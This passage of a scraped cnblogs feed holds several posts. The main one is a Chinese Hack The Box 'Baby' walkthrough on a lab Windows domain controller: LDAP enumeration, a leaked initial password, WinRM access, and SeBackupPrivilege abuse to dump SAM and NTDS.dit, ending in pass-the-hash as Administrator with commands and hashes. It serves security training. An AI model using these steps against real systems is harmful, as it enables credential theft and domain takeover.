href=\"https://mp.weixin.qq.com/s/UsUxTSQ_AtVlrXAe7HFPeQ\" rel=\"noopener nofollow\">CVX免费凸优化建模工具</a>,<a href=\"https://mp.weixin.qq.com/s/SP1ou_DyuLb1TgzI0JH2PA\" rel=\"noopener nofollow\">Yalmip免费的优化建模工具</a>,<a href=\"https://mp.weixin.qq.com/s/A8p7H7BquSsIBbMh3eMLGg\" rel=\"noopener nofollow\">CasADi开源最优化控制工具</a></p>\n<p><code>基于Python的优化建模工具</code> — <strong>代表作</strong>：\n<a href=\"https://mp.weixin.qq.com/s/A8p7H7BquSsIBbMh3eMLGg\" rel=\"noopener nofollow\">CasADi非线性优化和最优控制</a>,<a href=\"https://mp.weixin.qq.com/s/L687fP8uaGdmMVmqVY1QKA\" rel=\"noopener nofollow\">Gekko数值优化和动态系统建模</a>,<a href=\"https://mp.weixin.qq.com/s/fnd3-Hu2OkEnIXJkW-ObfA\" rel=\"noopener nofollow\">Pyomo面向对象代数建模语言</a></p>\n<p><code>科学计算软件</code> — <strong>代表作</strong>：\n<a href=\"https://mp.weixin.qq.com/s/37BW460fBosmIzZU9_a9hQ\" rel=\"noopener nofollow\">oneAPI统一的异构编程模型</a>,<a href=\"https://mp.weixin.qq.com/s/WUk6KdAQwE-GfOPQSBBG2w\" rel=\"noopener nofollow\">CUDA人工智能时代的基石</a>,<a href=\"https://mp.weixin.qq.com/s/ZB--8yvT_khcB8ZpTcQUGQ\" rel=\"noopener nofollow\">OpenFOAM开源的CFD软件</a>,<a href=\"https://mp.weixin.qq.com/s/OtHkmLUkaREP-ktpcLLajQ\" rel=\"noopener nofollow\">COMSOL业界多物理场仿真软件</a></p>\n<p><code>全球优化建模平台</code> — <strong>代表作</strong>：\n<a href=\"https://mp.weixin.qq.com/s/mXjzRlPe2-v2ow7MQynChQ\" rel=\"noopener nofollow\">AMPL数学规划建模语言</a>,<a href=\"https://mp.weixin.qq.com/s/LjOTgVMij56jufQxHltsXQ\" rel=\"noopener nofollow\">AIMMS快速优化建模工具</a>,<a href=\"https://mp.weixin.qq.com/s/bAvCxUWyNmFgGYZQlQeOeA\" rel=\"noopener nofollow\">GAMS通用代数建模系统</a>,<a href=\"https://mp.weixin.qq.com/s/J8pur1XjjUXL52Jiv71H3Q\" rel=\"noopener nofollow\">JuMP数学优化建模语言（学习中…）</a></p>\n<p><code>人类在思考</code> — <strong>代表作：</strong><a href=\"https://mp.weixin.qq.com/s/n7vfkfiEz5t8Wq2YJvMMWA\" rel=\"noopener nofollow\">公众号排版数学公式的经验</a>,<a href=\"https://mp.weixin.qq.com/s/J5g9gGaCc0aAOkrjQ-fxtg\" rel=\"noopener nofollow\">200篇论文🆚1个优化求解器</a>,<a href=\"https://mp.weixin.qq.com/s/N1F7lVLi_YsNHNnvYQHTKQ\" rel=\"noopener nofollow\">盗版Windows系统🆚破解版LINGO18</a></p>\n<p><code>数学是第三世界</code> — <strong>代表作</strong>：\n<a href=\"https://mp.weixin.qq.com/s/PHjmBFYPJlBagcqJjX9udg\" rel=\"noopener nofollow\">数学研究需要师徒传承吗？</a>,<a href=\"https://mp.weixin.qq.com/s/uluBnkrO4Q59nUJ9o3QEIA\" rel=\"noopener nofollow\">数学的三次数学危机</a>,<a href=\"https://mp.weixin.qq.com/s/6MMMjFMCaAD4SmZXrD7x4Q\" rel=\"noopener nofollow\">矩阵空间的特殊矩阵</a>,<a href=\"https://mp.weixin.qq.com/s/z3jGTYjFhjWVx1OUyOzlpQ\" rel=\"noopener nofollow\">函数梯度的可视化</a></p>\n</section>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-23 12:34</span>&nbsp;\n<a href=\"https://www.cnblogs.com/boyogala\">博優旮旯</a>&nbsp;\n阅读(<span id=\"post_view_count\">109</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "2025年度总结",
      "link": "https://www.cnblogs.com/ustcwqf/p/19524288",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ustcwqf/p/19524288\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 23:59\">\n    <span>2025年度总结</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>今天回家了，前两天刚刚本科毕设答辩完，感觉很轻松。</p>\n<p>2026年的这个寒假返乡算是本科阶阶段回家比较早的一次了，主要是想回家陪陪家人们，可能以后花大段时间陪他们的机会会越来越少了，就想着赶快把没完成的实现了吧（就是不知道舍友今年还会不会想起来再贴福字春联了）。大一的时候因疫情要提前放假，当时我是因为备考四级推迟了行程；大二那年是要参加数学建模美赛培训留校了一周，当时我也没打算参加这个，主要是为后面数学建模国赛做准备；大三那年推迟是因为要跟学术导师做个项目出来，也算为我曲曲折折的科研生活画个短暂的句号。如今的我，也算是站在人生的十字路口，还有很多东西要学习要经历要体验，在过去也算是摆了一段时间，起码在我的眼里算是吧，但又如何去定义摆呢？这也是人生的一种体验，走在人生的边上，向前看看再向后看看，才能走的更远！</p>\n<p>这篇帖子是我这个博客的第一篇的帖子，我就把这个平台当做学习的笔记本，思想的落脚台，在学习过程中不忘反思与总结、借鉴与交流，不断提升我的技能栈与生命力，争取做一个卓越的工程师、出色的科研人员……拥有升华的灵魂和进步的头脑，让世界因为我的存在而有一点变化。</p>\n<p>可能会好奇，题目是2025年度总结，为什么在说这些事？因为：凡是过往，皆为序章。过去的成就和遗憾我就不在第一篇帖子提了，可能确实对我来说微不足道但有弥足珍贵。但无论怎么样，我还是要好好把握当下，我相信行动什么时候都不晚。</p>\n<p>加油，期待那个闪闪发光自信的你！</p>\n<p>最后以我高三临近高考常用的非智能手机听的一首歌的片段结尾，“2026，猜猜who is coming”。</p>\n<p><img alt=\"54a27a6d7fb795840be220b05352848f\" class=\"lazyload\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-23 23:59</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ustcwqf\">科大姜伯约</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "【渗透测试】HTB靶场之Baby 全过程wp",
      "link": "https://www.cnblogs.com/DSchenzi/p/19524267",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DSchenzi/p/19524267\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 23:36\">\n    <span>【渗透测试】HTB靶场之Baby 全过程wp</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"htb-baby\">HTB Baby</h1>\n<p>靶机IP 10.129.234.71</p>\n<p>先扫描一下端口</p>\n<p><img alt=\"image-20260123154626334\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233507969-1874310201.png\" /></p>\n<p><img alt=\"image-20260123154632081\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233508764-1095414454.png\" /></p>\n<p>发现开了445端口（SMB协议）</p>\n<h2 id=\"smb-tcp-445\">SMB-TCP 445</h2>\n<pre><code class=\"language-kotlin\">┌──(root㉿kali)-[~/桌面/HTB/baby]\n└─# netexec smb 10.129.234.71 --generate-hosts-file hosts\nSMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)\n\n┌──(root㉿kali)-[~/桌面/HTB/baby]\n└─# cat hosts\n10.129.234.71     BABYDC.baby.vl baby.vl BABYDC\n\n┌──(root㉿kali)-[~/桌面/HTB/baby]\n└─# cat hosts /etc/hosts | sudo sponge /etc/hosts\n</code></pre>\n<p><img alt=\"image-20260123160402706\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233509254-1103075982.png\" /></p>\n<p>尝试对目标smb服务进行guest身份的共享枚举</p>\n<pre><code class=\"language-kotlin\">┌──(root㉿kali)-[~/桌面/HTB/baby]\n└─# netexec smb 10.129.234.71 -u guest -p '' --shares           \nSMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)\nSMB         10.129.234.71   445    BABYDC           [-] baby.vl\\guest: STATUS_ACCOUNT_DISABLED\n\n发现账号被禁用\n</code></pre>\n<p><img alt=\"image-20260123165858680\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233509588-1401908669.png\" /></p>\n<p>该方法不行</p>\n<h2 id=\"ldap-tcp-389\">LDAP-TCP 389</h2>\n<p>使用netexec工具从目标机器上提取(dump)LDAP中的用户数据（比如域用户名、组、权限等）</p>\n<pre><code>netexec ldap BABYDC.baby.vl -u '' -p '' --query \"(objectClass=*)\" \"\"\n</code></pre>\n<p><img alt=\"image-20260123172431090\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233509882-310242601.png\" /></p>\n<p>用<code>sAMAccountName</code>查询可用于登录的账户名</p>\n<pre><code>netexec ldap BABYDC.baby.vl -u '' -p '' --query \"(sAMAccountName=*)\" \"\"\n</code></pre>\n<p><img alt=\"image-20260123174514007\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233510292-841050102.png\" /></p>\n<p>可以看到这里有一个初始密码<code>BabyStart123!</code></p>\n<p>但依旧匹配不了</p>\n<p><img alt=\"image-20260123175345605\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233510657-214084091.png\" /></p>\n<p>经过发现在上一个的<code>objectClass=*</code>中最后有一个<code>Caroline Robinson</code>，没有关联的数据</p>\n<p><img alt=\"image-20260123180128913\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233510937-2060520192.png\" /></p>\n<pre><code>┌──(root㉿kali)-[~/桌面/HTB/baby]\n└─# netexec smb BABYDC.baby.vl -u Caroline.Robinson -p 'BabyStart123!'\nSMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)\nSMB         10.129.234.71   445    BABYDC           [-] baby.vl\\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE\n</code></pre>\n<p>虽然失败了，但是说的是<code>STATUS_PASSWORD_MUST_CHANGE</code></p>\n<h2 id=\"password-change\">password change</h2>\n<p>可以使用<code>netexec change-password</code>模块</p>\n<p>这里建议去github下载最新版本的nxc</p>\n<p><a href=\"https://github.com/Pennyw0rth/NetExec\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/Pennyw0rth/NetExec</a></p>\n<pre><code class=\"language-kotlin\">┌──(root㉿kali)-[~/桌面/shentougongju]\n└─# ./nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=chenzi\n[*] Initializing SMB protocol database\nSMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)\nSMB         10.129.234.71   445    BABYDC           [-] baby.vl\\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE\nCHANGE-P... 10.129.234.71   445    BABYDC           [-] SMB-SAMR password change failed: SAMR SessionError: code: 0xc000006c - STATUS_PASSWORD_RESTRICTION - When trying to update a password, this status indicates that some password update rule has been violated. For example, the password may not meet length criteria.\n</code></pre>\n<p>需要一个更复杂的密码</p>\n<pre><code class=\"language-kotlin\">┌──(root㉿kali)-[~/桌面/shentougongju]\n└─# ./nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=chenzi123!\nSMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)\nSMB         10.129.234.71   445    BABYDC           [-] baby.vl\\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE\nCHANGE-P... 10.129.234.71   445    BABYDC           [+] Successfully changed password for Caroline.Robinson\n</code></pre>\n<p>修改成功，我们看看密码策略</p>\n<pre><code class=\"language-kotlin\">./nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'chenzi123!' --pass-pol\n</code></pre>\n<p><img alt=\"image-20260123214423536\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233511245-1106560302.png\" /></p>\n<h2 id=\"get-shell\">Get Shell</h2>\n<p>枚举一下SMB共享资源</p>\n<pre><code class=\"language-kotlin\">./nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'chenzi123!' --shares\n</code></pre>\n<pre><code class=\"language-kotlin\">┌──(root㉿kali)-[~/桌面/shentougongju]\n└─# ./nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'chenzi123!' --shares\nSMB         10.129.234.71   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)\nSMB         10.129.234.71   445    BABYDC           [+] baby.vl\\Caroline.Robinson:chenzi123! \nSMB         10.129.234.71   445    BABYDC           [*] Enumerated shares\nSMB         10.129.234.71   445    BABYDC           Share           Permissions     Remark\nSMB         10.129.234.71   445    BABYDC           -----           -----------     ------\nSMB         10.129.234.71   445    BABYDC           ADMIN$          READ            Remote Admin\nSMB         10.129.234.71   445    BABYDC           C$              READ,WRITE      Default share\nSMB         10.129.234.71   445    BABYDC           IPC$            READ            Remote IPC\nSMB         10.129.234.71   445    BABYDC           NETLOGON        READ            Logon server share \nSMB         10.129.234.71   445    BABYDC           SYSVOL          READ            Logon server share \n</code></pre>\n<p>确认 了<code>Caroline.Robinson</code> 是有实际权限的域账户，不是空壳</p>\n<p>既然获得了账户凭证，我们可以通过<code>WinRM</code>协议远程登录目标机器</p>\n<pre><code class=\"language-kotlin\">evil-winrm -i baby.vl -u caroline.robinson -p chenzi123!\n</code></pre>\n<p><img alt=\"image-20260123215834962\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233511575-1724740137.png\" /></p>\n<p>得到了shell，user.txt在destop下</p>\n<h2 id=\"privilege-escalation\">Privilege Escalation</h2>\n<p>whoami /priv 查看当前用户的权限</p>\n<pre><code class=\"language-kotlin\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Desktop&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre>\n<h3 id=\"获取sam和system渗透黄金特权\">获取SAM和system(渗透黄金特权)</h3>\n<p>我们看到他拥有SeBackupPrivilege和SeRestorePrivilege权限，这些权限通常授予Backup Operators组中的用户。如果我们使用 <code>whoami /groups</code>进行检查，会发现该用户确实属于这个组</p>\n<p><img alt=\"image-20260123221656949\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233511917-1217962269.png\" /></p>\n<p>SeBackupPrivilege权限将允许我们创建注册表节文件备份，一旦破解这些文件，将能得到重要信息，如用户的NTLM哈希</p>\n<p>更具体地说，我们需要SAM和SYSTEM组件，SAM存储了本地账户地元数据以及机器上本地用户经过哈希处理后的凭据（NTLM哈希）。而SYSTEM则包含用于推导出启动密钥所需地信息，该密钥用于解密SAM组件。</p>\n<pre><code class=\"language-kotlin\">补充：\n这里也就是渗透黄金特权的一种\n\n1. SeDebugPrivilege（调试特权）\n作用：允许调试任意进程（包括系统进程 lsass.exe）\n渗透价值：\n直接用 mimikatz 抓取 lsass 内存中的明文密码 / NTLM 哈希\n拿到本地管理员、域管理员密码\n一句话：有它 = 基本能直接拿密码\n\n2. SeBackupPrivilege + SeRestorePrivilege（备份 / 还原特权）\n作用：\nSeBackupPrivilege：绕过文件权限，备份任何文件（包括 SAM、NTDS.dit）\nSeRestorePrivilege：绕过文件权限，还原 / 覆盖任何文件（替换系统服务、写注册表）\n渗透价值：\n直接备份 SAM + SYSTEM → 拿本地管理员哈希\n直接备份 NTDS.dit + SYSTEM → 拿整个域的所有用户哈希\n替换系统服务 → 提权到 SYSTEM\n一句话：有它 = 能拿系统 / 域的 “密码总库”\n\n3. SeImpersonatePrivilege（模拟特权）\n作用：允许模拟其他用户身份执行操作\n渗透价值：\n配合 JuicyPotato / PrintSpoofer 等工具 → 直接提权到 SYSTEM\n模拟高权限用户执行命令、访问资源\n一句话：有它 = 土豆 / 南瓜提权套餐直接上\n\n4. SeTakeOwnershipPrivilege（获取所有权特权）\n作用：夺取任意文件 / 注册表项的所有权\n渗透价值：\n夺取 C:\\Windows\\System32\\config 等关键目录所有权 → 读写 SAM、SYSTEM\n夺取注册表项 → 修改系统配置、后门\n一句话：有它 = 能 “抢” 系统核心资源的控制权\n</code></pre>\n<pre><code class=\"language-kotlin\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Desktop&gt; reg save hklm\\sam .\\sam\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Desktop&gt; reg save hklm\\system .\\system\nThe operation completed successfully.\n</code></pre>\n<p>得到两个文件后，使用download进行下载</p>\n<pre><code class=\"language-kotlin\">*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Desktop&gt; download sam\n                                        \nInfo: Downloading C:\\Users\\Caroline.Robinson\\Desktop\\sam to sam \n                                                 \nInfo: Download successful! \n*Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Desktop&gt; download system\n                                        \nInfo: Downloading C:\\Users\\Caroline.Robinson\\Desktop\\system to system \n                                                 \nInfo: Download successful!\n</code></pre>\n<p>把你下载到 Kali 的 <code>sam</code> 和 <code>system</code> 文件，用 <code>impacket-secretsdump</code></p>\n<pre><code>impacket-secretsdump -sam sam -system system LOCAL\n</code></pre>\n<p><img alt=\"image-20260123224046407\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233512219-1609580535.png\" /></p>\n<p>格式：<code>用户名:RID:LM哈希:NTLM哈希:::</code></p>\n<p>管理员的NTLM哈希：8d992faed38128ae85e95fa35868bb43</p>\n<p>将得到的哈希进行传递</p>\n<p><img alt=\"image-20260123224406565\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233512584-827115900.png\" /></p>\n<p><img alt=\"image-20260123225139745\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233512933-2008782080.png\" /></p>\n<p>但登录不了</p>\n<h3 id=\"获取ntdsditdiskshadow创建c盘卷影副本\">获取NTDS.dit(diskshadow创建C盘卷影副本)</h3>\n<p>我们下一步将尝试得到域控哈希值。为此，我们需要NTDS.dit（域控制器存储所有域用户密码哈希的核心数据库）。然而，该文件被锁定，我们无法直接复制。因此，我们使用diskshadow工具创建当前硬盘的卷影副本。这样我们就可以导出，并访问该文件。</p>\n<pre><code>set verbose on\nset context persistent nowriters\nset metadata C:\\Windows\\Temp\\chenzi.cab\nadd volume c: alias chenzi\ncreate\nexpose %chenzi% e:\n</code></pre>\n<p>创建 C 盘的卷影副本，并将其映射为 E 盘，方便访问快照里的核心文件。</p>\n<p>并转换为windows格式</p>\n<p><img alt=\"image-20260123230058735\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233513253-419283735.png\" /></p>\n<p>上传文件</p>\n<pre><code>upload backup backup\n</code></pre>\n<p><img alt=\"image-20260123230325647\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233513554-518475911.png\" /></p>\n<pre><code>diskshadow /s backup\n</code></pre>\n<p><img alt=\"image-20260123230553944\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233513856-1453598300.png\" /></p>\n<p>可以看到放到了E盘</p>\n<p><img alt=\"image-20260123230644618\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233514192-479303148.png\" /></p>\n<p>由于该驱动器目前未被使用，我们可以使用robocopy将NTDS.dit文件复制到当前目录中</p>\n<pre><code class=\"language-kotlin\">robocopy /b E:\\Windows\\ntds . ntds.dit\n\n解释一下这个\n/b 备份模式\nE:\\Windows\\ntds 目录，包含了 C 盘的快照，能访问到被锁定的文件。\n. 表示目标目录即当前目录\nntds.dit即要复制的文件\n</code></pre>\n<p><img alt=\"image-20260123231154046\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233514557-629159052.png\" /></p>\n<p>这样我们就得到了ntds.dit</p>\n<p><img alt=\"image-20260123231215403\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233514838-1156191939.png\" /></p>\n<p>依旧也是下载下来</p>\n<p><img alt=\"image-20260123232059290\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233515120-243568768.png\" /></p>\n<p>然后回到kali</p>\n<pre><code>impacket-secretsdump -ntds ntds.dit -system system LOCAL\n</code></pre>\n<p><img alt=\"image-20260123232123965\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233515468-24476270.png\" /></p>\n<p>得到Administrator的哈希值：ee4457ae59f1e3fbd764e33d9cef123d</p>\n<p>然后再使用evil-winrm获得shell</p>\n<pre><code>evil-winrm -i baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d\n</code></pre>\n<p><img alt=\"image-20260123232201274\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260123233515821-1717971874.png\" /></p>\n<p>得到Administrator的shell</p>\n<h2 id=\"渗透总结\">渗透总结</h2>\n<p>本靶机核心是通过域用户凭证获取与黄金特权利用，实现从普通域用户到域管理员的权限提升。首先通过端口扫描与 LDAP 信息搜集，获取域用户<code>Caroline.Robinson</code>及初始密码，解决密码必须修改的限制后，利用该账户的<code>SeBackupPrivilege</code>和<code>SeRestorePrivilege</code>黄金特权，备份系统核心文件（SAM、SYSTEM、NTDS.dit），解析出域管理员哈希，最终通过哈希传递登录域控制器，完成渗透。</p>\n<h3 id=\"核心知识点\">核心知识点</h3>\n<h4 id=\"信息搜集核心\">信息搜集核心</h4>\n<ul>\n<li><strong>端口扫描重点</strong>：SMB（445）、LDAP（389/3268）、WinRM（5985）是域环境渗透关键端口，分别对应文件共享、用户信息查询、远程命令执行功能。</li>\n<li><strong>LDAP 枚举价值</strong>：可匿名查询域内用户、组信息，获取可登录账户名及潜在初始密码，为后续认证提供基础。</li>\n</ul>\n<h4 id=\"账户凭证与密码策略\">账户凭证与密码策略</h4>\n<ul>\n<li><strong>STATUS_PASSWORD_MUST_CHANGE</strong>：账户初始密码需修改，且新密码需符合域密码策略（如长度≥7 位、包含大小写 / 数字 / 特殊符号）。</li>\n<li><strong>密码策略查询</strong>：通过<code>--pass-pol</code>参数可获取域密码规则，指导新密码设置与后续爆破策略制定。</li>\n</ul>\n<h4 id=\"渗透黄金特权应用\">渗透黄金特权应用</h4>\n<ul>\n<li><strong>SeBackupPrivilege + SeRestorePrivilege</strong>：允许绕过文件权限，备份 / 还原系统核心文件（SAM、NTDS.dit），是域环境中获取所有用户哈希的关键特权。</li>\n<li><strong>卷影副本（VSS）</strong>：用于绕过 NTDS.dit 等被系统锁定的文件，通过<code>diskshadow</code>创建快照后可自由复制。</li>\n</ul>\n<h4 id=\"哈希传递攻击pass-the-hash\">哈希传递攻击（Pass-the-Hash）</h4>\n<ul>\n<li>无需破解明文密码，直接使用解析出的 NTLM 哈希登录目标机器，适用于 WinRM、SMB 等协议。</li>\n<li>域管理员哈希需从 NTDS.dit（域密码总库）中解析，而非本地 SAM 文件（仅存储本地账户哈希）。</li>\n</ul>\n<h3 id=\"重要命令汇总\">重要命令汇总</h3>\n<h4 id=\"信息搜集与环境配置\">信息搜集与环境配置</h4>\n<pre><code class=\"language-kotlin\"># 全端口扫描（获取关键端口）\n无影扫描工具 10.129.234.71 -p 1-65535\n# 添加主机映射（方便域环境访问）\necho \"10.129.234.71 BABYDC.baby.vl baby.vl BABYDC\" | sudo tee -a /etc/hosts\n# LDAP匿名枚举域用户\nnetexec ldap BABYDC.baby.vl -u '' -p '' --query \"(sAMAccountName=*)\" \"\"\n</code></pre>\n<h4 id=\"账号密码操作\">账号密码操作</h4>\n<pre><code class=\"language-kotlin\"># 修改域用户密码（解决STATUS_PASSWORD_MUST_CHANGE）\n./nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=chenzi123!\n# 查询域密码策略\n./nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'chenzi123!' --pass-pol\n# 枚举SMB共享资源（验证账户权限）\n./nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'chenzi123!' --shares\n</code></pre>\n<h4 id=\"远程登陆与权限查询\">远程登陆与权限查询</h4>\n<pre><code class=\"language-kotlin\"># WinRM远程登录（获取普通用户shell）\nevil-winrm -i baby.vl -u Caroline.Robinson -p 'chenzi123!'\n# 查询当前用户特权（确认黄金特权）\nwhoami /priv\n# 查询用户所属组（验证Backup Operators组身份）\nwhoami /groups\n</code></pre>\n<h4 id=\"核心文件备份与下载\">核心文件备份与下载</h4>\n<pre><code class=\"language-kotlin\"># 备份SAM和SYSTEM注册表文件（本地账户哈希）\nreg save hklm\\sam .\\sam\nreg save hklm\\system .\\system\n# 下载文件到Kali\ndownload sam\ndownload system\n# diskshadow批量创建卷影副本（备份NTDS.dit）\n# 先在Kali创建backup脚本并转换格式\nunix2dos backup\n# 上传脚本到目标机器\nupload backup backup\n# 执行脚本创建卷影副本并映射为E盘\ndiskshadow /s backup\n# 备份NTDS.dit（备份模式绕过锁定）\nrobocopy /b E:\\Windows\\ntds . ntds.dit\n# 下载NTDS.dit到Kali\ndownload ntds.dit\n</code></pre>\n<h4 id=\"哈希解析与域管理员登录\">哈希解析与域管理员登录</h4>\n<pre><code class=\"language-kotlin\"># 解析本地账户哈希（SAM+SYSTEM）\nimpacket-secretsdump -sam sam -system system LOCAL\n# 解析域用户哈希（NTDS.dit+SYSTEM）\nimpacket-secretsdump -ntds ntds.dit -system system LOCAL\n# 哈希传递登录域管理员（WinRM）\nevil-winrm -i baby.vl -u Administrator -H [域管理员NTLM哈希]\n</code></pre>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-23 23:36</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DSchenzi\">dynasty_chenzi</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "微软官方出品的 AI 初学者入门精品课程，21节课程教你构建生成式人工智能应用所需掌握的知识！",
      "link": "https://www.cnblogs.com/Can-daydayup/p/19524089",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Can-daydayup/p/19524089\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 21:26\">\n    <span>微软官方出品的 AI 初学者入门精品课程，21节课程教你构建生成式人工智能应用所需掌握的知识！</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<h2><span>前言</span></h2>\n<p><span>在人工智能浪潮席卷全球的当下，生成式 AI 正以前所未有的速度重塑着各个行业。为助力初学者快速踏入这一前沿领域，微软官方精心打造了这门 AI 初学者入门精品课程：<strong>Generative AI for Beginners</strong><span>。</span></span></p>\n<h2><span>课程介绍</span></h2>\n<p><span>Generative AI for Beginners 课程包含 21 节干货满满的课时，从基础概念到实践应用，全方位、系统性地传授构建生成式人工智能应用所需掌握的核心知识。内容涵盖大语言模型原理、提示工程、RAG、<span>AI Agent、图像生成、负责任 AI、安全与用户体验等关键主题，并提供 Python 与 TypeScript 双语言代码示例，帮助学习者边学边练。</span></span></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260123212311002-367538399.png\" /></p>\n<h2><span>支持多语言</span></h2>\n<p><span>本课程支持以下 50 多种语言：</span></p>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1336199/202601/1336199-20260123212329756-382307235.png\" /></p>\n<h2><span>生成式人工智能初学者（Python 与 TypeScript版）课程列表</span></h2>\n<p><span>通过微软云布道者的21节全面课程，学习构建生成式人工智能应用的基础知识。</span></p>\n<ul class=\"list-paddingleft-1\">\n<li><strong>生成式人工智能初学者（Python 与 TypeScript版）：</strong>&nbsp;<strong><span style=\"color: rgba(0, 0, 255, 1);\"><a href=\"https://github.com/microsoft/generative-ai-for-beginners\" rel=\"noopener nofollow\" target=\"_blank\"><span style=\"color: rgba(0, 0, 255, 